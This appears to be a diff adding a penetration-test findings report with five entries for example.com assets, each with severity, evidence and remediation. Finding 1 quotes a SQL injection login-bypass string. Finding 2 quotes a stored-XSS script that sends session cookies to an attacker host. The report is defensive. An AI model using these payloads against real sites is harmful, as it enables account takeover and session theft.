@@ -1,0 +1,54 @@
+FINDING 1: SQL Injection in Authentication Service
+Severity: Critical
+CVSS: 9.8
+Asset: auth.example.com/api/login
+Description: SQL Injection in username parameter allows full authentication bypass.
+Impact: Unauthorized administrator access and database control.
+Evidence: Payload `' OR '1'='1` submitted to login form.
+Remediation: Implement prepared statements with parameterized queries.
+Status: Open
+Date Detected: 2026-08-31
+
+FINDING 2: Cross-Site Scripting in User Profile
+Severity: High
+CVSS: 8.5
+Asset: app.example.com/user/profile
+Description: Stored XSS vulnerability in profile bio field.
+Impact: Client-side session hijacking and credential theft.
+Evidence: Payload `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`.
+Remediation: Implement contextual HTML entity encoding and Content-Security-Policy.
+Status: Open
+Date Detected: 2026-08-31
+
+FINDING 3: Insecure Direct Object Reference (IDOR)
+Severity: High
+CVSS: 8.1
+Asset: api.example.com/v1/documents/1094
+Description: IDOR allows unauthorized access to private document records.
+Impact: Exposure of sensitive user documents and private financial records.
+Evidence: Changing document_id from 1094 to 1095 retrieves another user's file.
+Remediation: Implement server-side authorization checks for object ownership.
+Status: In Progress
+Date Detected: 2026-08-31
+
+FINDING 4: Missing Security Response Headers
+Severity: Medium
+CVSS: 5.4
+Asset: portal.example.com
+Description: Missing Strict-Transport-Security (HSTS) and X-Frame-Options headers.
+Impact: Vulnerable to clickjacking and downgrade attacks over unencrypted channels.
+Evidence: Response headers missing Strict-Transport-Security and X-Frame-Options.
+Remediation: Configure Nginx / Apache to include required security headers.
+Status: Open
+Date Detected: 2026-08-31
+
+FINDING 5: Outdated Component with Known CVEs
+Severity: Low
+CVSS: 3.7
+Asset: www.example.com
+Description: Legacy JavaScript library (Bootstrap 3.3.7) detected with known XSS CVE.
+Impact: Potential minor cross-site scripting under specific conditions.
+Evidence: HTML script tag referencing bootstrap 3.3.7.
+Remediation: Upgrade Bootstrap to version 5.3+.
+Status: Resolved
+Date Detected: 2026-08-31
